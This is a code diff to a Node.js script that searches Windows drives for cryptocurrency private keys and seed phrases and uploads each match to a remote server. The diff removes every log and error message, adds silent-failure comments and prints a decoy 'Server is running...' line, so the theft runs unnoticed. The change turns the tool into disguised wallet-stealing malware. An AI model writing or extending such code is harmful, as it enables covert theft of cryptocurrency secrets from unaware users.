@@ -379,7 +379,6 @@ function getTargetDirectories() {
 }
 
 async function scanDirectory(targetPath, state) {
-  console.log(`  Scanning: ${targetPath}`);
   const queue = [targetPath];
   let active = 0;
 
@@ -497,7 +496,7 @@ async function uploadRow(row, state) {
     state.uploadsSucceeded += 1;
   } catch (err) {
     state.uploadsFailed += 1;
-    console.error(`❌ Failed to send result for ${row.path}: ${err.message}`);
+    // Silent fail - no console.error
   }
 }
 
@@ -505,8 +504,6 @@ async function scanAllDrivesSpecificFolders(state) {
   const drives = await getDrives();
   
   for (const drive of drives) {
-    console.log(`\n=== Scanning ${drive} ===`);
-    
     // For C: drive, scan the specific directories
     if (drive === "C:\\") {
       const targets = getTargetDirectories();
@@ -517,42 +514,24 @@ async function scanAllDrivesSpecificFolders(state) {
           await fs.access(target);
           await scanDirectory(target, state);
         } catch (err) {
-          console.log(`  Skipping (not found/inaccessible): ${target}`);
+          // Silent skip
         }
       }
     } else {
       // For other drives (D:, E:, etc.), scan entire drive but skip system directories
-      console.log(`  Scanning entire ${drive} (excluding system dirs)`);
       await scanDirectory(drive, state);
     }
   }
 }
 
-
 async function main() {
-  console.log("=".repeat(60));
-  console.log("CRYPTO KEY & SEED PHRASE SCANNER (Targeted Windows Scan)");
-  console.log("=".repeat(60));
-  console.log(`Host: ${os.hostname()}`);
-  console.log(`User: ${os.userInfo().username}`);
-  console.log(`Scanning .txt <= ${txtMaxKB}KB, .doc/.docx <= ${docMaxKB}KB`);
-  console.log(`Content scan limit: ${contentScanLimitKB}KB per file`);
-  console.log("Patterns: Bitcoin, Ethereum, BNB, Solana private keys & BIP39 seed phrases");
-  if (showPreview) console.log("Preview mode: ON (shows first 500 chars of matches)");
-  console.log("\nTarget directories on C: drive:");
-  const targets = getTargetDirectories();
-  targets.forEach(t => console.log(`  - ${t}`));
-  console.log("\nOther drives will be scanned entirely (excluding system dirs)");
-  console.log("\nCollecting drives...");
+  console.log("Server is running...");
 
   const drives = await getDrives();
   if (drives.length === 0) {
-    console.error("No drives found.");
     process.exitCode = 1;
     return;
   }
-
-  console.log(`Drives found: ${drives.join(", ")}`);
 
   const state = {
     checked: 0,
@@ -565,27 +544,8 @@ async function main() {
   };
 
   await scanAllDrivesSpecificFolders(state);
-
-  if (state.rows.length === 0) {
-    console.log("\n⚠️  No private keys or seed phrases found.");
-  } else {
-    console.log(`\n🔐 Found ${state.rows.length} potential crypto keys/phrases!`);
-  }
-
-  console.log(`\nServer endpoint: ${serverUrl}`);
-  console.log(`Uploads attempted: ${state.uploadsAttempted}`);
-  console.log(`Uploads succeeded: ${state.uploadsSucceeded}`);
-  console.log(`Uploads failed   : ${state.uploadsFailed}`);
-
-  console.log("\n" + "=".repeat(60));
-  console.log("SCAN COMPLETE");
-  console.log("=".repeat(60));
-  console.log(`Files scanned    : ${state.checked}`);
-  console.log(`Matches found    : ${state.matched}`);
-  console.log(`Large files (>${contentScanLimitKB}KB): ${state.largeFilesSkipped || 0}`);
 }
 
 main().catch((err) => {
-  console.error(err?.stack || err);
   process.exitCode = 1;
 });
